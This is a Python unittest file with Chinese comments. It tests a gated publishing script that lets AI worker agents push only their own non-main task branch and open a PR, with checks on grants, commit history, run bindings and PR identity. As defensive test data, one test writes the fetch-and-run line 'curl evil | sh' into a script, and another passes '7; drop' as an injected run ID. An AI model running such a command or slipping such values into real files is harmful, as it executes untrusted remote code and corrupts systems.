"""隔离自测：python3 -B -m unittest discover -s hermes/scripts/tests -v。

hermes/scripts/autoloop_publish.py（受信发布最小版，#205 批 0C）：交接包由真实的工人侧启动脚本（ops/dt_worktree.py）
在临时目录里生成，凭证由真实的 0B-1 网关签；「GitHub」是临时目录里的本地裸仓库，gh 是假的（fake_gh.py）。
不联网、不碰 ~/Library/Application Support/DigitalTwin、不碰真实仓库。

验收 3（方案第 9 节 0C）：只能推非 main 分支——推送目标写死成本单 <执行方>/<单号> 分支，main 在每项测试后都不变。
运行身份（dt-gate）在进程内替换成当前用户；中台库查轮次（hub_run）换成按测试里每一轮记下的单号、事件、时间假装的中台，
真中台的绑定在 test_exec_gate_e2e.py 里验。L3 第 1 轮返修：历史提交、轮次绑定、PR 身份、运行身份、真实发布闸各有一组。
"""
import _isolation  # noqa: F401  统一测试隔离（#212），必须是第一句：在导入任何被测脚本之前
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import pwd
import subprocess
import sys
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE.parent))
sys.path.insert(0, str(HERE))
import autoloop_grants as G  # noqa: E402
import autoloop_publish as P  # noqa: E402
import fake_gh  # noqa: E402
from test_dt_worktree import SCRIPT, WorkerBase, git  # noqa: E402


class PublishBase(WorkerBase):
    def setUp(self):
        super().setUp()
        r = self.root
        self.gh_state = r / "gh"
        exe = fake_gh.install(r / "ghbin", self.gh_state)
        p = mock.patch.dict(os.environ, {"DT_PUBLISH_OUTBOX": str(self.outbox), "DT_PUBLISH_MIRRORS": str(r / "mirrors"),
                                         "DT_PUBLISH_LOG": str(r / "publish.jsonl"),
                                         "FAKE_GH_STATE": str(self.gh_state), **{k: v for k, v in
                                                                                  self.wenv.items() if k.startswith("GIT_")}})
        p.start()
        self.addCleanup(p.stop)
        self.hub_override, self.hub_cards = {}, {}
        self.backend = {"remote": f"file://{r}/remote/{{github}}.git", "gh": str(exe)}
        for q in (mock.patch.object(P, "GATE_USER", pwd.getpwuid(os.geteuid()).pw_name),
                  mock.patch.object(P, "TEST_BACKEND", self.backend),
                  mock.patch.object(P, "hub_run", side_effect=self.fake_hub_run),
                  mock.patch.object(P, "hub_card", side_effect=self.fake_hub_card)):
            q.start()
            self.addCleanup(q.stop)
        self.main_before = git("rev-parse", "main", cwd=self.remote)

    def fake_hub_run(self, run_id):
        """假中台：按 run_turn 记下的这一轮（单号、执行方、事件、排进来的时间）回答；hub_override 改字段，None 表示查不到。"""
        meta = getattr(self, "turn_runs", {}).get(run_id)
        if meta is None or self.hub_override.get(run_id, 1) is None:
            return None
        ex = meta["executor"]
        events = [{"source": e.get("source"), "key": e.get("id"), "type": e.get("type"), "subject": e.get("subject"),
                   "detail": e.get("detail")} for e in meta["events"]]
        run = {"id": int(run_id), "rule": f"dispatch-dt-sandbox-{ex}", "agent": f"dt-{ex}",
               "lane": meta["events"][0]["subject"], "state": "done", "created_at": meta["created_at"],
               "summary": meta.get("summary", ""), "events": events}
        run.update(self.hub_override.get(run_id) or {})
        return run

    def fake_hub_card(self, card_id):
        """假中台的卡片：hub_cards 里登记了就用登记的；没登记的当成最近一轮派单（没被挡回去的）提的问题。"""
        if card_id in self.hub_cards:
            return self.hub_cards[card_id]
        for run_id, meta in reversed(list(getattr(self, "turn_runs", {}).items())):
            if any(e["type"].startswith("dispatch.") for e in meta["events"]) and \
                    not meta.get("summary", "").startswith("停下了"):
                return {"id": card_id, "kind": "ask", "lane": meta["events"][0]["subject"], "run_id": run_id}
        return None

    def fake_run(self, tid, events, summary="改好了", created_at=None):
        """直接在假中台里登记一轮（不经启动脚本），返回轮次号。"""
        self.turn_no = getattr(self, "turn_no", 100) + 1
        self.turn_runs[str(self.turn_no)] = {
            "executor": "claude", "events": events, "summary": summary,
            "created_at": created_at or G.dt.datetime.now(G.dt.timezone.utc).isoformat().replace("+00:00", "Z")}
        return str(self.turn_no)

    def legit_pr(self, tid, head, **over):
        pr = {"number": 8, "url": "u8", "state": "OPEN", "baseRefName": "main", "headRefName": f"claude/{tid}",
              "headRefOid": head, "isCrossRepository": False, "headRepository": {"name": "dt-sandbox"},
              "headRepositoryOwner": {"login": "o"}}
        pr.update(over)
        return pr

    def redo_handoff(self, tid):
        """在工作目录里手工做完提交后，再跑一轮（不改文件）让启动脚本按新的头提交重写交接包。"""
        r, _ = self.run_turn([self.answer_event(tid)], FAKE_MODE="none")
        self.assertEqual(r.returncode, 0, r.stderr)
        return self.handoff(tid)

    def commit(self, tid, msg):
        git("add", "-A", cwd=self.wt(tid))
        git("commit", "-q", "-m", msg, cwd=self.wt(tid))

    def tearDown(self):
        self.assertEqual(git("rev-parse", "main", cwd=self.remote), self.main_before, "main 被动过")

    def remote_branch(self, tid, executor="claude"):
        r = subprocess.run(["git", "rev-parse", "--verify", "--quiet", f"refs/heads/{executor}/{tid}"],
                           cwd=self.remote, capture_output=True, text=True)
        return r.stdout.strip() or None

    def gh_calls(self):
        return fake_gh.calls(self.gh_state)

    def worked(self, mode="edit"):
        tid = self.new_live_task()
        r, _ = self.run_turn([self.dispatch_event(tid)], FAKE_MODE=mode)
        self.assertEqual(r.returncode, 0, r.stderr)
        return tid

    def rejects(self, tid, words):
        with self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn(words, str(c.exception))
        self.assertIsNone(self.remote_branch(tid))

    def rewrite_manifest(self, tid, **fields):
        p = self.outbox / tid / "handoff.json"
        m = json.loads(p.read_text())
        m.update(fields)
        p.write_text(json.dumps(m))


class Publish(PublishBase):
    def test_pushes_only_the_task_branch_and_opens_pr(self):
        tid = self.worked()
        out = P.publish(tid)
        head = self.handoff(tid)["head"]
        self.assertEqual(self.remote_branch(tid), head)
        self.assertEqual((out["pushed"], out["pr_opened"], out["branch"]), (True, True, f"claude/{tid}"))
        create = [c for c in self.gh_calls() if c[:2] == ["pr", "create"]]
        (c,) = create
        self.assertEqual((P_opt(c, "-H"), P_opt(c, "-B"), P_opt(c, "-R")), (f"claude/{tid}", "main", "o/dt-sandbox"))
        self.assertTrue(P_opt(c, "-t").startswith(f"{tid}："))
        refs = git("for-each-ref", "--format=%(refname)", "refs/heads", cwd=self.remote).split()
        self.assertEqual(sorted(refs), sorted(["refs/heads/main", f"refs/heads/claude/{tid}"]))
        log = [json.loads(x) for x in (self.root / "publish.jsonl").read_text().splitlines()]
        self.assertEqual(log[-1]["what"], "发布")

    def test_second_publish_is_idempotent_and_resume_fast_forwards(self):
        tid = self.worked()
        P.publish(tid)
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, self.handoff(tid)["head"])]))
        out = P.publish(tid)
        self.assertEqual((out["pushed"], out["pr_opened"], out["pr"]), (False, False, "u8"))
        self.run_turn([self.answer_event(tid)])
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, self.handoff(tid)["head"])]))
        out = P.publish(tid)
        self.assertTrue(out["pushed"])
        self.assertEqual(self.remote_branch(tid), self.handoff(tid)["head"])

    def test_closed_pr_is_not_reopened(self):
        tid = self.worked()
        (self.gh_state / "pr_list.json").write_text(json.dumps([{"number": 8, "url": "u8", "state": "CLOSED"}]))
        with self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn("已关闭或已合并", str(c.exception))

    def test_branch_names_agree_with_worker(self):
        spec = importlib.util.spec_from_file_location("dt_worktree", SCRIPT)
        w = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(w)
        for ex in G.EXECUTORS:
            self.assertEqual(w.branch_name(ex, "t-20261118-abcdef"), P.branch_name(ex, "t-20261118-abcdef"))


class OnlyNonMain(PublishBase):
    """验收 3：只能推非 main，只推本单分支。"""

    def test_manifest_naming_main_or_other_branch_is_refused(self):
        tid = self.worked()
        for branch in ("main", "claude/t-20260101-abcdef", f"agent/claude/{tid}", f"codex/{tid}", f"claude/{tid}/x"):
            self.rewrite_manifest(tid, branch=branch)
            self.rejects(tid, "交接清单的内容不合格式")

    def test_bundle_with_extra_refs_is_refused(self):
        tid = self.worked()
        wt = self.wt(tid)
        m = self.handoff(tid)
        bundle = self.outbox / tid / m["bundle"]
        git("update-ref", "refs/heads/main", m["head"], cwd=wt)                  # 工人把 main 也指到自己的提交
        git("bundle", "create", "-q", str(bundle), f"refs/heads/claude/{tid}", "refs/heads/main", f"^{m['base']}",
            cwd=wt)
        self.rewrite_manifest(tid, bundle_sha256=hashlib.sha256(bundle.read_bytes()).hexdigest())
        self.rejects(tid, "不只有本单分支")

    def test_head_or_hash_mismatch_is_refused(self):
        tid = self.worked()
        self.rewrite_manifest(tid, bundle_sha256="0" * 64)
        self.rejects(tid, "哈希对不上")
        tid2 = self.worked()
        self.rewrite_manifest(tid2, head=self.handoff(tid2)["base"])
        self.rejects(tid2, "头提交对不上")

    def test_base_not_on_main_is_refused(self):
        tid = self.worked()
        head = self.handoff(tid)["head"]
        self.rewrite_manifest(tid, base=head)                                     # 基线写成自己的提交
        self.rejects(tid, "基线不是 main 上的提交")

    def test_symlinked_manifest_is_refused(self):
        tid = self.worked()
        p = self.outbox / tid / "handoff.json"
        real = self.root / "elsewhere.json"
        real.write_text(p.read_text())
        p.unlink()
        p.symlink_to(real)
        self.rejects(tid, "读不到交接清单")

    def test_existing_remote_branch_is_never_overwritten(self):
        tid = self.worked()
        seed = self.root / "seed"
        git("checkout", "-q", "-b", "x", cwd=seed)
        (seed / "foreign.txt").write_text("x")
        git("add", "-A", cwd=seed)
        git("commit", "-q", "-m", "别人的提交", cwd=seed)
        git("push", "-q", str(self.remote), f"x:refs/heads/claude/{tid}", cwd=seed)
        foreign = git("rev-parse", "HEAD", cwd=seed)
        with self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn("不覆盖", str(c.exception))
        self.assertEqual(self.remote_branch(tid), foreign)

    def test_assert_not_main(self):
        for bad in ("main", "claude/main", "agent/claude/t-20261118-abcdef", "claude/../main", "other/t-20261118-abcdef"):
            with self.assertRaises(P.Rejected):
                P.assert_not_main(bad)
        P.assert_not_main("claude/t-20261118-abcdef")
        P.assert_not_main("codex/t-20261118-abcdef")

    def test_sensitive_paths_are_handed_to_owner(self):
        tid = self.worked(mode="workflow")
        self.rejects(tid, "高风险路径（.github/workflows/ci.yml）")


class GrantAtPublish(PublishBase):
    def test_revoked_or_frozen_after_handoff_is_not_published(self):
        tid = self.worked()
        G.revoke(tid, now=self.now)
        self.rejects(tid, "凭证已撤销")
        tid = self.worked()
        G.freeze(tid, "推翻", now=self.now)
        self.rejects(tid, "凭证已冻结")

    def test_old_generation_handoff_is_not_published(self):
        tid = self.worked()
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=self.now)
        self.rejects(tid, "第 1 代已作废")

    def test_manifest_cannot_choose_repo_or_executor(self):
        tid = self.worked()
        self.rewrite_manifest(tid, executor="codex", branch=f"codex/{tid}")
        self.rejects(tid, "仓库或执行方和凭证不一致")

    def test_grant_without_push_or_pr_action(self):
        tid = self.worked()
        self.sql("UPDATE grants SET actions = ? WHERE task_id = ?", (json.dumps(["edit"]), tid))
        self.rejects(tid, "凭证不允许 push_branch")

    def test_push_allowed_but_not_open_pr(self):
        tid = self.worked()
        self.sql("UPDATE grants SET actions = ? WHERE task_id = ?", (json.dumps(["edit", "push_branch"]), tid))
        self.rejects(tid, "凭证不允许 open_pr")                                # 动手前两个动作一起预检，不推半截（P2-01）
        self.assertEqual(self.gh_calls(), [])

    def test_revoked_after_precheck_is_not_pushed(self):
        """预检之后、推之前凭证被撤销：推之前那次现读拦住，不推。"""
        tid = self.worked()

        def revoke_then_check(*a):
            G.revoke(tid, now=self.now)
            return []
        with mock.patch.object(P, "history_hits", side_effect=revoke_then_check):
            self.rejects(tid, "凭证已撤销（push_branch）")

    def test_revoked_after_push_opens_no_pr(self):
        """推完、开 PR 之前凭证被撤销：开 PR 之前那次现读拦住，不开 PR（0D 前推和撤销之间的窗口见审查 P1-07）。"""
        tid = self.worked()
        real = P.git

        def git_then_revoke(*a, **k):
            r = real(*a, **k)
            if a[0] == "push":
                G.revoke(tid, now=self.now)
            return r
        with mock.patch.object(P, "git", side_effect=git_then_revoke), self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn("凭证已撤销（open_pr）", str(c.exception))
        self.assertEqual(self.remote_branch(tid), self.handoff(tid)["head"])
        self.assertEqual([x for x in self.gh_calls() if x[:2] == ["pr", "create"]], [])

    def test_refusals_are_logged_by_cli(self):
        tid = self.worked()
        G.revoke(tid, now=self.now)
        with contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertEqual(P.main(["publish", "--task", tid]), 1)
        self.assertFalse(json.loads(out.getvalue())["ok"])
        log = [json.loads(x) for x in (self.root / "publish.jsonl").read_text().splitlines()]
        self.assertEqual((log[-1]["what"], log[-1]["task_id"]), ("拒发", tid))

    def test_scan_is_read_only(self):
        tid = self.worked()
        (item,) = P.scan()
        self.assertEqual((item["task_id"], item["check"]), (tid, "可以发"))
        self.assertIsNone(self.remote_branch(tid))
        self.assertEqual(self.gh_calls(), [])


class History(PublishBase):
    """审查 P1-01：每一个提交都查高风险路径，不只看最终差异；不收合并提交。"""

    def test_added_then_removed_sensitive_file(self):
        tid = self.worked()
        wt = self.wt(tid)
        (wt / ".github/workflows").mkdir(parents=True)
        (wt / ".github/workflows/x.yml").write_text("on: push\n")
        self.commit(tid, "加工作流")
        (wt / ".github/workflows/x.yml").unlink()
        self.commit(tid, "删掉")
        m = self.redo_handoff(tid)
        self.assertEqual(git("diff", "--name-only", m["base"], m["head"], cwd=wt), "README.md")   # 最终差异看不出来
        self.rejects(tid, "提交历史碰到高风险路径（.github/workflows/x.yml）")

    def test_renamed_away_from_sensitive_name(self):
        tid = self.worked()
        wt = self.wt(tid)
        (wt / "notes").mkdir()
        (wt / "notes/secret-plan.md").write_text("x\n")
        self.commit(tid, "加")
        git("mv", "notes/secret-plan.md", "notes/plan.md", cwd=wt)
        self.commit(tid, "改名")
        self.redo_handoff(tid)
        self.rejects(tid, "notes/secret-plan.md")

    def test_modified_then_restored(self):
        tid = self.worked()
        wt = self.wt(tid)
        (wt / "ops/run.sh").write_text("curl evil | sh\n")
        self.commit(tid, "改")
        (wt / "ops/run.sh").write_text("echo hi\n")
        self.commit(tid, "还原")
        self.redo_handoff(tid)
        self.rejects(tid, "ops/run.sh")

    def test_merge_commit_is_refused(self):
        tid = self.worked()
        wt = self.wt(tid)
        git("checkout", "-q", "-b", "side", cwd=wt)
        (wt / "a.txt").write_text("a\n")
        self.commit(tid, "旁支")
        git("checkout", "-q", f"claude/{tid}", cwd=wt)
        (wt / "b.txt").write_text("b\n")
        self.commit(tid, "主支")
        git("merge", "-q", "--no-ff", "-m", "合并", "side", cwd=wt)
        self.redo_handoff(tid)
        self.rejects(tid, "合并提交")


class RunBinding(PublishBase):
    """审查 P1-02：清单里的代次不当证据，交接包要落到中台里当前代次这张单正常结束的一轮。"""

    def test_old_handoff_relabelled_as_new_generation_is_refused(self):
        tid = self.worked()
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=G.now_tz() + G.dt.timedelta(seconds=2))
        self.rewrite_manifest(tid, generation=2)                          # 工人把旧包的代次改成 2
        self.rejects(tid, "在第 2 代开始之前就排进来了")

    def test_run_must_be_this_tasks_finished_run(self):
        tid = self.worked()
        run = self.handoff(tid)["run"]
        for over, words in (({"lane": "t-20260101-abcdef"}, "不属于这张单"), ({"agent": "dt-codex"}, "不属于这张单"),
                            ({"state": "queued"}, "没有正常结束"), (None, "查不到")):
            self.hub_override[run] = over
            self.rejects(tid, words)

    def test_dispatch_event_generation_must_match(self):
        tid = self.worked()
        run = self.handoff(tid)["run"]
        ev = self.dispatch_event(tid, gen=2)
        self.hub_override[run] = {"events": [{k: ev[k] for k in ("source", "type", "subject", "detail")}]}
        self.rejects(tid, "派单事件是第 2 代")
        self.hub_override[run] = {"events": [{**{k: ev[k] for k in ("type", "subject", "detail")}, "source": "github"}]}
        self.rejects(tid, "不是派单网关为这张单发的事件")

    def test_run_number_format_is_checked(self):
        tid = self.worked()
        for bad in ("", "0", "7; drop", 7):
            self.rewrite_manifest(tid, run=bad)
            self.rejects(tid, "交接清单的内容不合格式")


class GenerationEvidence(PublishBase):
    """审查第 2 轮 P1-02：这一轮要有当前代次的正面证据；被挡回去的轮次、只有复查的轮次、追不到当前派单的回答都不认。"""

    def to_gen2(self, tid):
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=G.now_tz() + G.dt.timedelta(seconds=2))
        return G.dt.datetime.now(G.dt.timezone.utc) + G.dt.timedelta(seconds=3)

    def iso(self, t):
        return t.isoformat().replace("+00:00", "Z")

    def test_refused_run_cannot_relabel_old_handoff(self):
        tid = self.worked()
        later = self.to_gen2(tid)
        run = self.fake_run(tid, [self.dispatch_event(tid, gen=2)], summary="停下了：凭证已冻结", created_at=self.iso(later))
        self.rewrite_manifest(tid, generation=2, run=run)                 # 旧包挂到第 2 代被挡回去的那一轮
        self.rejects(tid, "被启动脚本挡回去了")

    def test_stopped_turn_from_worker_is_refused(self):
        tid = self.worked()
        r, _ = self.run_turn([self.dispatch_event(tid, kind="rework")], FAKE_MODE="revoke")   # 交接前凭证失效
        self.assertTrue(self.final(r)["result"].startswith("停下了：凭证已撤销"), r.stdout)
        run = list(self.turn_runs)[-1]
        self.assertTrue(self.turn_runs[run]["summary"].startswith("停下了"))
        with G.tx() as con:
            row = dict(G.grant_row(con, tid))
        self.assertIn("挡回去", P.check_run(run, row, 1))

    def test_timer_only_run_is_not_publishable(self):
        tid = self.worked()
        run = self.fake_run(tid, [{"id": f"timer:{tid}:1", "source": "hermes", "type": "timer.due", "subject": tid}])
        self.rewrite_manifest(tid, run=run)
        self.rejects(tid, "没有当前代次的派单证据")

    def test_answer_run_traces_back_to_current_dispatch(self):
        tid = self.worked()
        first = list(self.turn_runs)[-1]
        later = self.to_gen2(tid)
        ans = self.fake_run(tid, [self.answer_event(tid)], created_at=self.iso(later))
        self.rewrite_manifest(tid, generation=2, run=ans)
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": first}
        self.rejects(tid, "提问的那一轮：这一轮在第 2 代开始之前就排进来了")     # 晚到的旧回答
        for card, words in (({"id": "9", "kind": "notice", "lane": tid, "run_id": first}, "追溯不到"),
                            ({"id": "9", "kind": "ask", "lane": "t-20260101-abcdef", "run_id": first}, "追溯不到"),
                            (None, "追溯不到")):
            self.hub_cards["9"] = card
            self.rejects(tid, words)
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": ans}       # 自己追自己：有层数上限
        self.rejects(tid, "往回追了 5 层")
        asked = self.fake_run(tid, [self.dispatch_event(tid, gen=2)], created_at=self.iso(later))
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": asked}
        self.assertTrue(P.publish(tid)["pushed"])                         # 追到第 2 代的派单才发


    def test_dispatch_does_not_excuse_old_answer_in_same_run(self):
        """审查第 3 轮 P1-02：当前代次的派单和旧回答合在同一轮，旧回答照样要追溯。"""
        tid = self.worked()
        first = list(self.turn_runs)[-1]
        later = self.to_gen2(tid)
        mixed = self.fake_run(tid, [self.dispatch_event(tid, gen=2), self.answer_event(tid)], created_at=self.iso(later))
        self.rewrite_manifest(tid, generation=2, run=mixed)
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": first}        # 第 1 代提的问题
        self.rejects(tid, "提问的那一轮：这一轮在第 2 代开始之前就排进来了")
        self.hub_cards["9"] = None
        self.rejects(tid, "追溯不到")
        asked = self.fake_run(tid, [self.dispatch_event(tid, gen=2)], created_at=self.iso(later))
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": asked}
        self.assertTrue(P.publish(tid)["pushed"])


class PrIdentity(PublishBase):
    """审查 P1-05：同名分支已有开着的 PR，核对目标、来源、分支、头提交都对才沿用。"""

    def test_existing_pr_is_reused_only_if_exactly_ours(self):
        tid = self.worked()
        P.publish(tid)
        head = self.handoff(tid)["head"]
        for over in ({"isCrossRepository": True}, {"headRepositoryOwner": {"login": "fork-owner"}},
                     {"headRepository": {"name": "other"}}, {"baseRefName": "dev"}, {"headRefOid": "0" * 40},
                     {"headRefName": f"claude/{tid}-x"}):
            (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head, **over)]))
            with self.assertRaises(P.Rejected) as c:
                P.publish(tid)
            self.assertIn("不沿用", str(c.exception))
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head)] * 2))
        with self.assertRaises(P.Rejected):
            P.publish(tid)                                                # 两个开着的也不认
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head)]))
        self.assertEqual(P.publish(tid)["pr"], "u8")


class GateAndRealRemote(PublishBase):
    def test_only_dt_gate_account_may_publish(self):
        tid = self.worked()
        with mock.patch.object(P, "GATE_USER", "dt-gate"):
            self.rejects(tid, "只在 dt-gate 账号里跑")
            self.assertEqual(P.scan()[0]["check"], "可以发")                 # 只读的 scan 不受限

    def test_publish_is_off_before_0d_without_test_backend(self):
        """审查第 2 轮 P1-07：开关关着时整体拒绝，开 PR 也不做（远端分支已经是这个头提交、不用推时同样）。"""
        tid = self.worked()
        git("fetch", "-q", str(self.wt(tid)), f"refs/heads/claude/{tid}:refs/heads/claude/{tid}", cwd=self.remote)  # 远端已有
        env = {"DT_PUBLISH_REMOTE": self.backend["remote"], "DT_GH": self.backend["gh"]}   # 环境变量不算数
        for backend in (None, {**self.backend, "remote": "https://github.com/{github}.git"}):
            with mock.patch.object(P, "TEST_BACKEND", backend), mock.patch.dict(os.environ, env):
                with self.assertRaises(P.Rejected) as c:
                    P.publish(tid)
            self.assertIn("整体关闭", str(c.exception))
        self.assertEqual(self.gh_calls(), [])
        self.assertEqual(P.remote_url("o/x"), self.backend["remote"].format(github="o/x"))
        with mock.patch.object(P, "TEST_BACKEND", None):
            self.assertEqual((P.remote_url("o/x"), P.gh_cmd()), ("https://github.com/o/x.git", "gh"))


def P_opt(args, name):
    return args[args.index(name) + 1] if name in args else None


if __name__ == "__main__":
    unittest.main()
